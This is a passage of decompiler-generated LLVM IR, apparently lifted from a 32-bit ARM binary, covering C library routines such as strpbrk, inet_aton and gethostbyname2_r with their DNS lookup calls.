dec_label_pc_1ad78:                               ; preds = %dec_label_pc_1acb4, %dec_label_pc_1aca8, %dec_label_pc_1ad70, %dec_label_pc_1ad60, %dec_label_pc_1ad58, %dec_label_pc_1ad48, %dec_label_pc_1ad40, %dec_label_pc_1ad30, %dec_label_pc_1ad28, %dec_label_pc_1ad18
  %v1_1ad7c = phi i32 [ %v1_1ad60, %dec_label_pc_1ad70 ], [ %v1_1ad60, %dec_label_pc_1ad60 ], [ %v1_1ad48, %dec_label_pc_1ad58 ], [ %v1_1ad48, %dec_label_pc_1ad48 ], [ %v1_1ad30, %dec_label_pc_1ad40 ], [ %v1_1ad30, %dec_label_pc_1ad30 ], [ %v0_1ad38, %dec_label_pc_1ad28 ], [ %v0_1ad38, %dec_label_pc_1ad18 ], [ %v0_1acbc, %dec_label_pc_1aca8 ], [ %v0_1acbc, %dec_label_pc_1acb4 ]
  ret i32 %v1_1ad7c

; uselistorder directives
  uselistorder i32 %v4_1acd4, { 1, 0 }
  uselistorder i32 %v2_1acd4, { 0, 2, 1 }
  uselistorder i32 %v0_1ad38, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1acc8, { 1, 0 }
  uselistorder i32 %v1_1acbc, { 1, 0, 2 }
  uselistorder i32 %v0_1acc02, { 2, 1, 0 }
  uselistorder i32 %v1_1aca0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_1ad78, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1ad18, { 1, 0 }
  uselistorder label %dec_label_pc_1aca8, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1adb4

dec_label_pc_1ad90:                               ; preds = %dec_label_pc_1ada0
  %v3_1ada0 = zext i8 %v2_1ada0 to i32
  %v1_1ada8 = add i32 %v0_1ada8, 1
  %v1_1ad90 = load i32, i32* %r0.global-to-local, align 4
  %v9_1ad90 = icmp eq i32 %v3_1ada0, %v1_1ad90
  br i1 %v9_1ad90, label %dec_label_pc_1ad98, label %dec_label_pc_1ada0

dec_label_pc_1ad98:                               ; preds = %dec_label_pc_1ad90
  %v0_1ad98 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1ad98, i32* %r0.global-to-local, align 4
  ret i32 %v0_1ad98

dec_label_pc_1ada0:                               ; preds = %dec_label_pc_1ad90, %dec_label_pc_1adb4
  %v0_1ada8 = phi i32 [ %v1_1ada8, %dec_label_pc_1ad90 ], [ %arg2, %dec_label_pc_1adb4 ]
  %v1_1ada0 = inttoptr i32 %v0_1ada8 to i8*
  %v2_1ada0 = load i8, i8* %v1_1ada0, align 1
  %v2_1ada4 = icmp eq i8 %v2_1ada0, 0
  br i1 %v2_1ada4, label %dec_label_pc_1adb0, label %dec_label_pc_1ad90

dec_label_pc_1adb0:                               ; preds = %dec_label_pc_1ada0
  %v0_1adb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1adb0 = add i32 %v0_1adb0, 1
  br label %dec_label_pc_1adb4

dec_label_pc_1adb4:                               ; preds = %entry, %dec_label_pc_1adb0
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_1adb0, %dec_label_pc_1adb0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1adb4 = inttoptr i32 %storemerge to i8*
  %v2_1adb4 = load i8, i8* %v1_1adb4, align 1
  %v3_1adb4 = zext i8 %v2_1adb4 to i32
  store i32 %v3_1adb4, i32* %r0.global-to-local, align 4
  %v2_1adb8 = icmp eq i8 %v2_1adb4, 0
  %v0_1adbc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1adb8, i32 %v0_1adbc)
  br label %dec_label_pc_1ada0

; uselistorder directives
  uselistorder i32 %v0_1ada8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1adb4, { 1, 0 }
  uselistorder label %dec_label_pc_1ada0, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1adc8 = load i32, i32* @r4, align 4
  store i32 %v3_1adc8, i32* %stack_var_-28, align 4
  %v0_1add0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1add0 = icmp eq i32 %v0_1add0, 0
  br i1 %v2_1add0, label %dec_label_pc_1aeac, label %dec_label_pc_1ade0

dec_label_pc_1ade0:                               ; preds = %entry
  br label %dec_label_pc_1adf8

dec_label_pc_1adf8:                               ; preds = %dec_label_pc_1ade0, %dec_label_pc_1ae70
  %v1_1ae70 = phi i32 [ 0, %dec_label_pc_1ade0 ], [ %v5_1ae70, %dec_label_pc_1ae70 ]
  %v0_1ae74 = phi i32 [ 1, %dec_label_pc_1ade0 ], [ %v1_1ae74, %dec_label_pc_1ae70 ]
  %v0_1adf8 = phi i32 [ %v0_1add0, %dec_label_pc_1ade0 ], [ %v0_1adf812, %dec_label_pc_1ae70 ]
  %v1_1adf8 = inttoptr i32 %v0_1adf8 to i8*
  %v2_1adf8 = load i8, i8* %v1_1adf8, align 1
  %v3_1adf8 = zext i8 %v2_1adf8 to i32
  %v4_1adfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 676) to i32*), align 4
  %v2_1ae00 = mul nuw nsw i32 %v3_1adf8, 2
  %v2_1ae04 = add i32 %v2_1ae00, %v4_1adfc
  %v3_1ae04 = inttoptr i32 %v2_1ae04 to i16*
  %v4_1ae04 = load i16, i16* %v3_1ae04, align 2
  %v1_1ae08 = and i16 %v4_1ae04, 8
  %v2_1ae08 = icmp eq i16 %v1_1ae08, 0
  br i1 %v2_1ae08, label %dec_label_pc_1aeac, label %dec_label_pc_1ae10

dec_label_pc_1ae10:                               ; preds = %dec_label_pc_1adf8
  br label %dec_label_pc_1ae30

dec_label_pc_1ae18:                               ; preds = %dec_label_pc_1ae30
  %v2_1ae18 = mul i32 %v0_1ae70, 10
  %v1_1ae1c = add i32 %v2_1ae18, -48
  %v2_1ae20 = add i32 %v3_1ae30, %v1_1ae1c
  %v8_1ae28 = icmp sgt i32 %v2_1ae20, 255
  br i1 %v8_1ae28, label %dec_label_pc_1aeac, label %dec_label_pc_1ae2c

dec_label_pc_1ae2c:                               ; preds = %dec_label_pc_1ae18
  %v1_1ae2c = add i32 %v0_1ae60, 1
  store i32 %v1_1ae2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ae30

dec_label_pc_1ae30:                               ; preds = %dec_label_pc_1ae10, %dec_label_pc_1ae2c
  %v0_1ae70 = phi i32 [ 0, %dec_label_pc_1ae10 ], [ %v2_1ae20, %dec_label_pc_1ae2c ]
  %v0_1ae60 = phi i32 [ %v0_1adf8, %dec_label_pc_1ae10 ], [ %v1_1ae2c, %dec_label_pc_1ae2c ]
  %v1_1ae30 = inttoptr i32 %v0_1ae60 to i8*
  %v2_1ae30 = load i8, i8* %v1_1ae30, align 1
  %v3_1ae30 = zext i8 %v2_1ae30 to i32
  %v2_1ae34 = mul nuw nsw i32 %v3_1ae30, 2
  %v2_1ae38 = add i32 %v2_1ae34, %v4_1adfc
  %v3_1ae38 = inttoptr i32 %v2_1ae38 to i16*
  %v4_1ae38 = load i16, i16* %v3_1ae38, align 2
  %v6_1ae38 = zext i16 %v4_1ae38 to i32
  %v1_1ae3c = and i32 %v6_1ae38, 8
  %v2_1ae3c = icmp eq i32 %v1_1ae3c, 0
  br i1 %v2_1ae3c, label %dec_label_pc_1ae44, label %dec_label_pc_1ae18

dec_label_pc_1ae44:                               ; preds = %dec_label_pc_1ae30
  %v7_1ae44 = icmp eq i32 %v0_1ae74, 4
  br i1 %v7_1ae44, label %dec_label_pc_1ae5c, label %dec_label_pc_1ae4c

dec_label_pc_1ae4c:                               ; preds = %dec_label_pc_1ae44
  %v7_1ae4c = icmp eq i8 %v2_1ae30, 46
  br i1 %v7_1ae4c, label %dec_label_pc_1ae54, label %dec_label_pc_1aeac

dec_label_pc_1ae54:                               ; preds = %dec_label_pc_1ae4c
  %v1_1ae54 = add i32 %v0_1ae60, 1
  store i32 %v1_1ae54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ae70

dec_label_pc_1ae5c:                               ; preds = %dec_label_pc_1ae44
  %v2_1ae5c = icmp eq i8 %v2_1ae30, 0
  %v1_1ae60 = add i32 %v0_1ae60, 1
  store i32 %v1_1ae60, i32* %r0.global-to-local, align 4
  br i1 %v2_1ae5c, label %dec_label_pc_1ae70, label %dec_label_pc_1ae68

dec_label_pc_1ae68:                               ; preds = %dec_label_pc_1ae5c
  %v1_1ae68 = and i32 %v6_1ae38, 32
  %v2_1ae68 = icmp eq i32 %v1_1ae68, 0
  br i1 %v2_1ae68, label %dec_label_pc_1aeac, label %dec_label_pc_1ae70

dec_label_pc_1ae70:                               ; preds = %dec_label_pc_1ae68, %dec_label_pc_1ae5c, %dec_label_pc_1ae54
  %v0_1adf812 = phi i32 [ %v1_1ae60, %dec_label_pc_1ae68 ], [ %v1_1ae60, %dec_label_pc_1ae5c ], [ %v1_1ae54, %dec_label_pc_1ae54 ]
  %v4_1ae70 = mul i32 %v1_1ae70, 256
  %v5_1ae70 = or i32 %v0_1ae70, %v4_1ae70
  %v1_1ae74 = add nuw nsw i32 %v0_1ae74, 1
  %v7_1ae7c = icmp slt i32 %v1_1ae74, 5
  br i1 %v7_1ae7c, label %dec_label_pc_1adf8, label %dec_label_pc_1ae80

dec_label_pc_1ae80:                               ; preds = %dec_label_pc_1ae70
  %v2_1ae80 = icmp eq i32 %arg2, 0
  br i1 %v2_1ae80, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_1ae80
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aeb0

bb:                                               ; preds = %dec_label_pc_1ae80
  %v4_1ae84 = udiv i32 %v5_1ae70, 16777216
  %v2_1ae88 = udiv i32 %v5_1ae70, 256
  %v5_1ae8c = and i32 %v2_1ae88, 65280
  %v2_1ae90 = and i32 %v5_1ae70, 65280
  %v5_1ae94 = mul nuw nsw i32 %v2_1ae90, 256
  %v5_1ae98 = mul i32 %v0_1ae70, 16777216
  %v6_1ae8c = or i32 %v4_1ae84, %v5_1ae98
  %v6_1ae94 = or i32 %v6_1ae8c, %v5_1ae8c
  %v6_1ae98 = or i32 %v6_1ae94, %v5_1ae94
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1aea4 = inttoptr i32 %arg2 to i32*
  store i32 %v6_1ae98, i32* %v3_1aea4, align 4
  %v2_1aeb0.pre = load i32, i32* %stack_var_-28, align 4
  %v1_1aeb4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aeb0

dec_label_pc_1aeac:                               ; preds = %dec_label_pc_1ae4c, %dec_label_pc_1ae68, %dec_label_pc_1adf8, %dec_label_pc_1ae18, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aeb0

dec_label_pc_1aeb0:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1aeac
  %v1_1aeb4 = phi i32 [ %v1_1aeb4.pre, %bb ], [ 0, %dec_label_pc_1aeac ], [ 1, %.thread7.thread ]
  %v2_1aeb0 = phi i32 [ %v2_1aeb0.pre, %bb ], [ %v3_1adc8, %dec_label_pc_1aeac ], [ %v3_1adc8, %.thread7.thread ]
  store i32 %v2_1aeb0, i32* @r4, align 4
  ret i32 %v1_1aeb4

; uselistorder directives
  uselistorder i32 %v1_1ae74, { 1, 0 }
  uselistorder i32 %v5_1ae70, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1ae60, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1aeb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1aeac, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1ae30, { 1, 0 }
  uselistorder label %dec_label_pc_1adf8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_1aec0 = load i32, i32* @r6, align 4
  %v12_1aec0 = load i32, i32* @r7, align 4
  %v15_1aec0 = load i32, i32* @r8, align 4
  %v18_1aec0 = load i32, i32* @sb, align 4
  %v21_1aec0 = load i32, i32* @sl, align 4
  %v7_1aec4 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_1aec4, label %dec_label_pc_1aee8, label %dec_label_pc_1af08

dec_label_pc_1aee8:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_1af00 = call i32 @gethostbyname_r()
  store i32 %v0_1af00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b154

dec_label_pc_1af08:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_1af10 = icmp eq i32 %arg2, 10
  %v2_1af14 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_1af14, align 4
  br i1 %v7_1af10, label %dec_label_pc_1af1c, label %dec_label_pc_1b150

dec_label_pc_1af1c:                               ; preds = %dec_label_pc_1af08
  %v1_1af1c = load i32, i32* @r7, align 4
  %v9_1af1c = icmp eq i32 %v1_1af1c, %arg1
  br i1 %v9_1af1c, label %dec_label_pc_1b150, label %dec_label_pc_1af24

dec_label_pc_1af24:                               ; preds = %dec_label_pc_1af1c
  %v0_1af24 = call i32 @__GI___errno_location()
  store i32 %v0_1af24, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1af24, i32* @r5, align 4
  %v0_1af30 = load i32, i32* @r4, align 4
  %v0_1af34 = load i32, i32* @r6, align 4
  store i32 %v0_1af34, i32* %r2.global-to-local, align 4
  %v1_1af38 = inttoptr i32 %v0_1af24 to i32*
  %v2_1af38 = load i32, i32* %v1_1af38, align 4
  store i32 %v2_1af38, i32* @r4, align 4
  %v0_1af3c = load i32, i32* @r8, align 4
  store i32 %v0_1af3c, i32* %r3.global-to-local, align 4
  %v0_1af40 = load i32, i32* @r7, align 4
  store i32 %v0_1af40, i32* %v1_1af38, align 4
  %v0_1af44 = load i32, i32* @sb, align 4
  store i32 %v0_1af44, i32* %r0.global-to-local, align 4
  %v2_1af48 = load i32, i32* @sl, align 4
  %v5_1af48 = load i32, i32* %ip.global-to-local, align 4
  %v0_1af4c = load i32, i32* @fp, align 4
  %v7_1af50 = call i32 @__get_hosts_byname_r(i32 %v0_1af44, i32 %v0_1af30, i32 %v0_1af34, i32 %v0_1af3c, i32 %v2_1af48, i32 %v5_1af48, i32 %v0_1af4c)
  store i32 %v7_1af50, i32* %r0.global-to-local, align 4
  %v2_1af54 = icmp eq i32 %v7_1af50, 0
  br i1 %v2_1af54, label %bb, label %dec_label_pc_1af60

bb:                                               ; preds = %dec_label_pc_1af24
  %v1_1af58 = load i32, i32* @r4, align 4
  %v2_1af58 = load i32, i32* @r5, align 4
  %v3_1af58 = inttoptr i32 %v2_1af58 to i32*
  store i32 %v1_1af58, i32* %v3_1af58, align 4
  br label %dec_label_pc_1b154

dec_label_pc_1af60:                               ; preds = %dec_label_pc_1af24
  %v0_1af60 = load i32, i32* @fp, align 4
  %v1_1af60 = inttoptr i32 %v0_1af60 to i32*
  %v2_1af60 = load i32, i32* %v1_1af60, align 4
  store i32 %v2_1af60, i32* %r3.global-to-local, align 4
  %v7_1af64 = icmp eq i32 %v2_1af60, 1
  br i1 %v7_1af64, label %dec_label_pc_1af80, label %dec_label_pc_1af6c

dec_label_pc_1af6c:                               ; preds = %dec_label_pc_1af60
  %v7_1af6c = icmp eq i32 %v2_1af60, 4
  br i1 %v7_1af6c, label %dec_label_pc_1af9c, label %dec_label_pc_1af74

dec_label_pc_1af74:                               ; preds = %dec_label_pc_1af6c
  %v3_1af74 = icmp eq i32 %v2_1af60, -1
  br i1 %v3_1af74, label %dec_label_pc_1af90, label %dec_label_pc_1b154

dec_label_pc_1af80:                               ; preds = %dec_label_pc_1af60
  %v7_1af80 = icmp eq i32 %v7_1af50, 2
  br i1 %v7_1af80, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_1af80
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1afa0

.thread1:                                         ; preds = %dec_label_pc_1af80
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_1afa0

dec_label_pc_1af90:                               ; preds = %dec_label_pc_1af74
  %v0_1af90 = load i32, i32* @r5, align 4
  %v1_1af90 = inttoptr i32 %v0_1af90 to i32*
  %v2_1af90 = load i32, i32* %v1_1af90, align 4
  store i32 %v2_1af90, i32* %r3.global-to-local, align 4
  %v7_1af94 = icmp eq i32 %v2_1af90, 2
  br i1 %v7_1af94, label %dec_label_pc_1af9c, label %dec_label_pc_1b154

dec_label_pc_1af9c:                               ; preds = %dec_label_pc_1af90, %dec_label_pc_1af6c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1afa0

dec_label_pc_1afa0:                               ; preds = %bb29, %.thread1, %dec_label_pc_1af9c
  %v0_1afa0 = load i32, i32* @r8, align 4
  %v1_1afa0 = sub i32 0, %v0_1afa0
  %v1_1afa4 = urem i32 %v1_1afa0, 4
  store i32 %v1_1afa4, i32* %r0.global-to-local, align 4
  %v1_1afa8 = load i32, i32* @sl, align 4
  %v2_1afa8 = sub i32 %v1_1afa8, %v1_1afa4
  %v1_1afac = add i32 %v2_1afa8, -24
  store i32 %v1_1afac, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1afb8 = load i32, i32* @r4, align 4
  %v1_1afb8 = load i32, i32* @r5, align 4
  %v2_1afb8 = inttoptr i32 %v1_1afb8 to i32*
  store i32 %v0_1afb8, i32* %v2_1afb8, align 4
  %v7_1afbc = icmp sgt i32 %v1_1afac, 255
  br i1 %v7_1afbc, label %dec_label_pc_1afc8, label %bb30

bb30:                                             ; preds = %dec_label_pc_1afa0
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1afc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1afc0 = load i32, i32* @fp, align 4
  %v2_1afc0 = inttoptr i32 %v1_1afc0 to i32*
  store i32 %v0_1afc0, i32* %v2_1afc0, align 4
  br label %dec_label_pc_1b154

dec_label_pc_1afc8:                               ; preds = %dec_label_pc_1afa0
  %v0_1afc03 = load i32, i32* %r3.global-to-local, align 4
  %v1_1afc04 = load i32, i32* @fp, align 4
  %v2_1afc05 = inttoptr i32 %v1_1afc04 to i32*
  store i32 %v0_1afc03, i32* %v2_1afc05, align 4
  %v0_1afc8 = load i32, i32* @r8, align 4
  %v1_1afc8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1afc8 = add i32 %v1_1afc8, %v0_1afc8
  store i32 %v2_1afc8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1afd0 = add i32 %v2_1afc8, 16
  store i32 %v1_1afd0, i32* %r2.global-to-local, align 4
  %v1_1afd4 = add i32 %v2_1afc8, 24
  store i32 %v1_1afd4, i32* @r5, align 4
  %v3_1afdc = inttoptr i32 %v1_1afd0 to i32*
  store i32 %v2_1afc8, i32* %v3_1afdc, align 4
  %v0_1afe0 = load i32, i32* @sb, align 4
  store i32 %v0_1afe0, i32* @r1, align 4
  %v0_1afe4 = load i32, i32* @r4, align 4
  %v1_1afe4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1afe4 = add i32 %v1_1afe4, 4
  %v3_1afe4 = inttoptr i32 %v2_1afe4 to i32*
  store i32 %v0_1afe4, i32* %v3_1afe4, align 4
  %v0_1afe8 = load i32, i32* @r5, align 4
  store i32 %v0_1afe8, i32* %r0.global-to-local, align 4
  %v0_1afec = load i32, i32* @sl, align 4
  store i32 %v0_1afec, i32* %r2.global-to-local, align 4
  %v3_1aff0 = call i32 @strncpy(i32 %v0_1afe8, i32 %v0_1afe0, i32 %v0_1afec)
  %v0_1aff4 = load i32, i32* @r4, align 4
  %v1_1aff4 = trunc i32 %v0_1aff4 to i8
  %v2_1aff4 = load i32, i32* @r5, align 4
  %v3_1aff4 = load i32, i32* @sl, align 4
  %v4_1aff4 = add i32 %v3_1aff4, %v2_1aff4
  %v5_1aff4 = inttoptr i32 %v4_1aff4 to i8*
  store i8 %v1_1aff4, i8* %v5_1aff4, align 1
  %v0_1aff8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1b000 = load i32, i32* @r8, align 4
  store i32 %v0_1b000, i32* %r2.global-to-local, align 4
  %v3_1b004 = inttoptr i32 %v0_1aff8 to i8*
  %v4_1b004 = call i32 @inet_pton(i32 10, i8* %v3_1b004, i32 %v0_1b000)
  store i32 %v4_1b004, i32* %r0.global-to-local, align 4
  %v1_1b008 = load i32, i32* @r4, align 4
  %v9_1b008 = icmp eq i32 %v4_1b004, %v1_1b008
  br i1 %v9_1b008, label %dec_label_pc_1b040, label %dec_label_pc_1b010

dec_label_pc_1b010:                               ; preds = %dec_label_pc_1afc8
  store i32 %v1_1afd0, i32* @ip, align 4
  %v0_1b018 = load i32, i32* @r6, align 4
  store i32 %v0_1b018, i32* %v2_1af14, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1b020 = load i32, i32* @r6, align 4
  %v2_1b020 = add i32 %v1_1b020, 8
  %v3_1b020 = inttoptr i32 %v2_1b020 to i32*
  store i32 10, i32* %v3_1b020, align 4
  %v0_1b024 = load i32, i32* @r4, align 4
  store i32 %v0_1b024, i32* %r0.global-to-local, align 4
  %v0_1b028 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b028 = add i32 %v0_1b028, 6
  store i32 %v1_1b028, i32* %r3.global-to-local, align 4
  %v1_1b02c = load i32, i32* @r6, align 4
  %v2_1b02c = add i32 %v1_1b02c, 12
  %v3_1b02c = inttoptr i32 %v2_1b02c to i32*
  store i32 %v1_1b028, i32* %v3_1b02c, align 4
  %v0_1b030 = load i32, i32* @r5, align 4
  %v1_1b030 = load i32, i32* @r6, align 4
  %v2_1b030 = inttoptr i32 %v1_1b030 to i32*
  store i32 %v0_1b030, i32* %v2_1b030, align 4
  %v0_1b034 = load i32, i32* @ip, align 4
  %v1_1b034 = load i32, i32* @r6, align 4
  %v2_1b034 = add i32 %v1_1b034, 16
  %v3_1b034 = inttoptr i32 %v2_1b034 to i32*
  store i32 %v0_1b034, i32* %v3_1b034, align 4
  %v0_1b038 = load i32, i32* @r4, align 4
  %v1_1b038 = load i32, i32* @fp, align 4
  %v2_1b038 = inttoptr i32 %v1_1b038 to i32*
  store i32 %v0_1b038, i32* %v2_1b038, align 4
  br label %dec_label_pc_1b154

dec_label_pc_1b040:                               ; preds = %dec_label_pc_1afc8
  %v0_1b040 = load i32, i32* @r7, align 4
  %v2_1b040 = icmp eq i32 %v0_1b040, 0
  br i1 %v2_1b040, label %dec_label_pc_1b048, label %dec_label_pc_1b140

dec_label_pc_1b048:                               ; preds = %dec_label_pc_1b040
  %v2_1b048 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1b048, i32* @r4, align 4
  store i32 %v2_1b048, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_1b058 = bitcast i32* %stack_var_-84 to i8*
  %v3_1b058 = call i32 @__GI_memset(i8* %v2_1b058, i32 0)
  store i32 %v3_1b058, i32* %r0.global-to-local, align 4
  %v2_1b060 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1b060, i32* @sb, align 4
  %v7_1b0a0 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1b064

dec_label_pc_1b064:                               ; preds = %dec_label_pc_1b0b8, %dec_label_pc_1b048
  store i32 %v2_1b060, i32* %r2.global-to-local, align 4
  store i32 %v2_1b048, i32* %r3.global-to-local, align 4
  %v0_1b070 = load i32, i32* @r5, align 4
  store i32 %v0_1b070, i32* %r0.global-to-local, align 4
  %v4_1b074 = inttoptr i32 %v0_1b070 to i8*
  %v5_1b074 = call i32 @__dns_lookup(i8* %v4_1b074, i32 28, i32 %v2_1b060, i32 %v2_1b048)
  store i32 %v5_1b074, i32* @r4, align 4
  %v1_1b078 = icmp slt i32 %v5_1b074, 0
  %v0_1b07c = load i32, i32* @sl, align 4
  store i32 %v0_1b07c, i32* %r2.global-to-local, align 4
  %v0_1b080 = load i32, i32* @r7, align 4
  %v1_1b080 = add i32 %v0_1b080, 1
  store i32 %v1_1b080, i32* @r7, align 4
  %v0_1b084 = load i32, i32* @r5, align 4
  store i32 %v0_1b084, i32* %r0.global-to-local, align 4
  br i1 %v1_1b078, label %dec_label_pc_1b140, label %dec_label_pc_1b08c

dec_label_pc_1b08c:                               ; preds = %dec_label_pc_1b064
  %v3_1b08c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1b08c, i32* @r1, align 4
  %v3_1b090 = call i32 @strncpy(i32 %v0_1b084, i32 %v3_1b08c, i32 %v0_1b07c)
  %v3_1b094 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1b094, i32* @r0, align 4
  %v0_1b098 = call i32 @free()
  store i32 %v0_1b098, i32* %r0.global-to-local, align 4
  %v0_1b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_1b0a4, i32* %r2.global-to-local, align 4
  %v0_1b0a8 = load i32, i32* @r5, align 4
  store i32 %v0_1b0a8, i32* @r3, align 4
  br i1 %v7_1b0a0, label %dec_label_pc_1b0b0, label %dec_label_pc_1b0e8

dec_label_pc_1b0b0:                               ; preds = %dec_label_pc_1b08c
  %v0_1b0b0 = load i32, i32* @r7, align 4
  %v8_1b0b4 = icmp sgt i32 %v0_1b0b0, 5
  br i1 %v8_1b0b4, label %dec_label_pc_1b0dc, label %dec_label_pc_1b0b8

dec_label_pc_1b0b8:                               ; preds = %dec_label_pc_1b0b0
  store i32 %tmp8, i32* @r1, align 4
  %v3_1b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1b0bc, i32* %r0.global-to-local, align 4
  %v0_1b0c0 = load i32, i32* @sl, align 4
  %v5_1b0c4 = call i32 @__decode_dotted(i32 %v3_1b0bc, i32 %tmp8, i32 %v0_1b0a4, i32 %v0_1b0a8, i32 %v0_1b0c0)
  store i32 %v5_1b0c4, i32* @r4, align 4
  %v3_1b0cc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1b0cc, i32* @r0, align 4
  %v0_1b0d0 = call i32 @free()
  store i32 %v0_1b0d0, i32* %r0.global-to-local, align 4
  %v0_1b0d4 = load i32, i32* @r4, align 4
  %v1_1b0d4 = icmp slt i32 %v0_1b0d4, 0
  br i1 %v1_1b0d4, label %dec_label_pc_1b0dc, label %dec_label_pc_1b064

dec_label_pc_1b0dc:                               ; preds = %dec_label_pc_1b0b8, %dec_label_pc_1b0b0
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b0e8:                               ; preds = %dec_label_pc_1b08c
  %v7_1b0e8 = icmp eq i32 %tmp9, 28
  br i1 %v7_1b0e8, label %dec_label_pc_1b0f0, label %dec_label_pc_1b138

dec_label_pc_1b0f0:                               ; preds = %dec_label_pc_1b0e8
  store i32 16, i32* @r2, align 4
  %v0_1b0f8 = load i32, i32* @r8, align 4
  store i32 %v0_1b0f8, i32* @r0, align 4
  %v0_1b0fc = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1afd0, i32* %r2.global-to-local, align 4
  %v1_1b108 = load i32, i32* @r6, align 4
  %v2_1b108 = add i32 %v1_1b108, 8
  %v3_1b108 = inttoptr i32 %v2_1b108 to i32*
  store i32 10, i32* %v3_1b108, align 4
  %v0_1b10c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b10c = add i32 %v0_1b10c, 6
  store i32 %v1_1b10c, i32* %r3.global-to-local, align 4
  %v1_1b110 = load i32, i32* @r6, align 4
  %v2_1b110 = add i32 %v1_1b110, 12
